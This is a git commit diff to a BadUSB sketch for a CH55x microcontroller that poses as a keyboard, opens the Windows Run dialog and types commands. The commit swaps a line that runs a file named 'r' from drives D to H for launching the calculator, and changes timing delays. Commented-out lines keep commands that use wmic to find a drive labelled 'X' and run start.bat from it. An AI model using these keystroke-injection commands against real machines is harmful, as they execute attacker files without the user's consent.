de157c5adcb1bace2cbc90fb272a7030b5a3e25e
Tetraz01e <142770351+AzidoPP@users.noreply.github.com>
2025-12-17 20:59:47 +0800

    Fix button pin definition and adjust delays

--- localBadUSB/CH55xduino-BadUSB.ino
+++ localBadUSB/CH55xduino-BadUSB.ino
@@ -21,7 +21,7 @@
 
 #include "src/userUsbHidKeyboard/USBHIDKeyboard.h"
 
-#define BUTTON1_PIN 30
+#define BUTTON1_PIN 30C
 #define BUTTON2_PIN 31
 #define BUTTON3_PIN 32
 
@@ -46,7 +46,7 @@ void setup() {
   Keyboard_press(KEY_LEFT_GUI);  // 按下 WIN 键
   Keyboard_press('r');           // 按下 R 键
   Keyboard_releaseAll();
-  delay(110);
+  delay(700);
   //cmd /c "for /f %d in ('wmic logicaldisk where "VolumeName='X'" get DeviceID ^| findstr /r "^.:"') do start "" "%d\start.bat""
   //cmd /c "for /f %i in ('wmic logicaldisk where "VolumeName='X'" get DeviceID')do %i\r"
   //cmd /c"for /f %i in ('wmic logicaldisk get DeviceID')do %i\r"
@@ -54,11 +54,12 @@ void setup() {
   //cmd /c"d:\r;e:\r;f:\r;g:\r;h:\r"
   //cmd /c"d:\r&e:\r&f:\r&g:\r&h:\r"
   //Keyboard_print("cmd /c\"for %i in (D E F G H I)do %i:\\r\"\r\n");
-  Keyboard_print("cmd /c\"d:\\r&e:\\r&f:\\r&g:\\r&h:\\r\"\r\n");
+  //Keyboard_print("cmd /c\"d:\\r&e:\\r&f:\\r&g:\\r&h:\\r\"\r\n");
+  Keyboard_print("calc\r\n");
 }
 
 void loop() {
-  delay(1200000);
+  delay(12000);
 
   if (!(Keyboard_getLEDStatus() & 2)) {
     Keyboard_press(KEY_CAPS_LOCK);
@@ -70,7 +71,7 @@ void loop() {
   Keyboard_press(KEY_LEFT_GUI);  // 按下 WIN 键
   Keyboard_press('r');           // 按下 R 键
   Keyboard_releaseAll();
-  delay(200);
+  delay(700);
   //cmd /c "for /f %d in ('wmic logicaldisk where "VolumeName='X'" get DeviceID ^| findstr /r "^.:"') do start "" "%d\start.bat""
   //cmd /c "for /f %i in ('wmic logicaldisk where "VolumeName='X'" get DeviceID')do %i\r"
   //cmd /c"for /f %i in ('wmic logicaldisk get DeviceID')do %i\r"
@@ -78,5 +79,5 @@ void loop() {
   //cmd /c"d:\r;e:\r;f:\r;g:\r;h:\r"
   //cmd /c"d:\r&e:\r&f:\r&g:\r&h:\r"
   //Keyboard_print("cmd /c\"for %i in (D E F G H I)do %i:\\r\"\r\n");
-  Keyboard_print("cmd /c\"d:\\r&e:\\r&f:\\r&g:\\r&h:\\r\"\r\n");
+  Keyboard_print("calc\r\n");
 }
